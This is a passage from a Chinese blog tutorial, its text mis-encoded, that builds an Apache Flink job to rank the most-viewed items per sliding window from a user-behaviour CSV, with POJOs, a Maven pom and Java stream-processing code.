<ul><li>openï¼šåˆå§‹åŒ–ï¼Œåœ¨è¿™é‡Œå¯ä»¥è·å–å½“å‰æµçš„çŠ¶æ€</li><li>processElementï¼šå¤„ç†æµä¸­æ¯ä¸€ä¸ªå…ƒç´ æ—¶è°ƒç”¨</li><li>onTimerï¼šå®šæ—¶è°ƒç”¨ï¼Œæ³¨å†Œå®šæ—¶å™¨Timerå¹¶è§¦å‘ä¹‹åçš„å›è°ƒæ“ä½œ</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20200602184003237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=AkjyX&originHeight=304&originWidth=652&originalType=binary&ratio=1&status=done&style=none"></p><h6 id="POJO"><a href="#POJO" class="headerlink" title="POJO"></a>POJO</h6><p>éœ€è¦ç”Ÿæˆget/setã€æ— å‚/æœ‰å‚æ„é€ å‡½æ•°ã€toString</p><ul><li><p> ItemViewCount  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long itemId;</span><br><span class="line"><span class="keyword">private</span> Long windowEnd;</span><br><span class="line"><span class="keyword">private</span> Long count;</span><br></pre></td></tr></table></figure></li><li><p> UserBehavior  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long uerId;</span><br><span class="line"><span class="keyword">private</span> Long itemId;</span><br><span class="line"><span class="keyword">private</span> Integer categoryId;</span><br><span class="line"><span class="keyword">private</span> String behavior;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 1-æ–‡ä»¶"><a href="#ä»£ç 1-æ–‡ä»¶" class="headerlink" title="ä»£ç 1-æ–‡ä»¶"></a>ä»£ç 1-æ–‡ä»¶</h6><ul><li><p> çˆ¶pomä¾èµ–  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>UserBehaviorAnalysis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>HotItemsAnalysis<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scala.binary.version</span>&gt;</span>2.12<span class="tag">&lt;/<span class="name">scala.binary.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kafka.version</span>&gt;</span>2.7.0<span class="tag">&lt;/<span class="name">kafka.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mysql.version</span>&gt;</span>8.0.19<span class="tag">&lt;/<span class="name">mysql.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- flink --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-java_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- kafka --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;kafka.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ItemViewCount;</span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingProcessingTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 6:07 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotItems</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä»csvæ–‡ä»¶ä¸­è·å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/UserBehaviorAnalysis/HotItemsAnalysis/src/main/resources/UserBehavior.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO,åˆ†é…æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; userBehaviorDataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. åˆ†ç»„å¼€çª—èšåˆï¼Œå¾—åˆ°æ¯ä¸ªçª—å£å†…å„ä¸ªå•†å“çš„countå€¼</span></span><br><span class="line">    <span class="comment">//        DataStream&lt;ItemViewCount&gt; windowAggStream = userBehaviorDataStream</span></span><br><span class="line">    DataStream&lt;ItemViewCount&gt; windowAggStream = userBehaviorDataStream</span><br><span class="line">      <span class="comment">// è¿‡æ»¤åªä¿ç•™pvè¡Œä¸º</span></span><br><span class="line">      .filter(userBehavior -&gt; <span class="string">&quot;pv&quot;</span>.equals(userBehavior.getBehavior()))</span><br><span class="line">      <span class="comment">// æŒ‰ç…§å•†å“IDåˆ†ç»„</span></span><br><span class="line">      .keyBy(UserBehavior::getItemId)</span><br><span class="line">      <span class="comment">// æ»‘åŠ¨çª—å£</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.minutes(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> ItemCountAgg(), <span class="keyword">new</span> WindowItemCountResult());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. æ”¶é›†åŒä¸€çª—å£çš„æ‰€æœ‰å•†å“çš„countæ•°æ®ï¼Œæ’åºè¾“å‡ºtop n</span></span><br><span class="line">    DataStream&lt;String&gt; resultStream = windowAggStream</span><br><span class="line">      <span class="comment">// æŒ‰ç…§çª—å£åˆ†ç»„</span></span><br><span class="line">      .keyBy(ItemViewCount::getWindowEnd)</span><br><span class="line">      <span class="comment">// ç”¨è‡ªå®šä¹‰å¤„ç†å‡½æ•°æ’åºå–å‰5</span></span><br><span class="line">      .process(<span class="keyword">new</span> TopNHotItems(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot items analysis&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰å¢é‡èšåˆå‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ItemCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">UserBehavior</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(UserBehavior value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰å…¨çª—å£å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowItemCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">ItemViewCount</span>, <span class="title">Long</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Long itemId, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;ItemViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Long windowEnd = window.getEnd();</span><br><span class="line">      Long count = input.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> ItemViewCount(itemId, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰KeyedProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopNHotItems</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">ItemViewCount</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰å±æ€§ï¼Œ TopNçš„å¤§å°</span></span><br><span class="line">    <span class="keyword">private</span> Integer topSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€åˆ—è¡¨ï¼Œä¿å­˜å½“å‰çª—å£å†…æ‰€æœ‰è¾“å‡ºçš„ItemViewCount</span></span><br><span class="line">    ListState&lt;ItemViewCount&gt; itemViewCountListState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      itemViewCountListState = getRuntimeContext().getListState(</span><br><span class="line">        <span class="keyword">new</span> ListStateDescriptor&lt;ItemViewCount&gt;(<span class="string">&quot;item-view-count-list&quot;</span>, ItemViewCount.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        @Override</span></span><br><span class="line">    <span class="comment">//        public void close() throws Exception &#123;</span></span><br><span class="line">    <span class="comment">//            itemViewCountListState.clear();</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotItems</span><span class="params">(Integer topSize)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.topSize = topSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(ItemViewCount value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// æ¯æ¥ä¸€æ¡æ•°æ®ï¼Œå­˜å…¥Listä¸­ï¼Œå¹¶æ³¨å†Œå®šæ—¶å™¨</span></span><br><span class="line">      itemViewCountListState.add(value);</span><br><span class="line">      <span class="comment">// æ¨¡æ‹Ÿç­‰å¾…ï¼Œæ‰€ä»¥è¿™é‡Œæ—¶é—´è®¾çš„æ¯”è¾ƒçŸ­(1ms)</span></span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å®šæ—¶å™¨è§¦å‘ï¼Œå½“å‰å·²æ”¶é›†åˆ°æ‰€æœ‰æ•°æ®ï¼Œæ’åºè¾“å‡º</span></span><br><span class="line">      ArrayList&lt;ItemViewCount&gt; itemViewCounts = Lists.newArrayList(itemViewCountListState.get().iterator());</span><br><span class="line">      <span class="comment">// ä»å¤šåˆ°å°‘(è¶Šçƒ­é—¨è¶Šå‰é¢)</span></span><br><span class="line">      itemViewCounts.sort((a, b) -&gt; -Long.compare(a.getCount(), b.getCount()));</span><br><span class="line">      StringBuilder resultBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;çª—å£ç»“æŸæ—¶é—´ï¼š&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// éå†åˆ—è¡¨ï¼Œå–top nè¾“å‡º</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(topSize, itemViewCounts.size()); i++) &#123;</span><br><span class="line">        ItemViewCount currentItemViewCount = itemViewCounts.get(i);</span><br><span class="line">        resultBuilder.append(<span class="string">&quot;NO &quot;</span>).append(i + <span class="number">1</span>).append(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          .append(<span class="string">&quot; å•†å“ID = &quot;</span>).append(currentItemViewCount.getItemId())</span><br><span class="line">          .append(<span class="string">&quot; çƒ­é—¨åº¦ = &quot;</span>).append(currentItemViewCount.getCount())</span><br><span class="line">          .append(System.lineSeparator());</span><br><span class="line">      &#125;</span><br><span class="line">      resultBuilder.append(<span 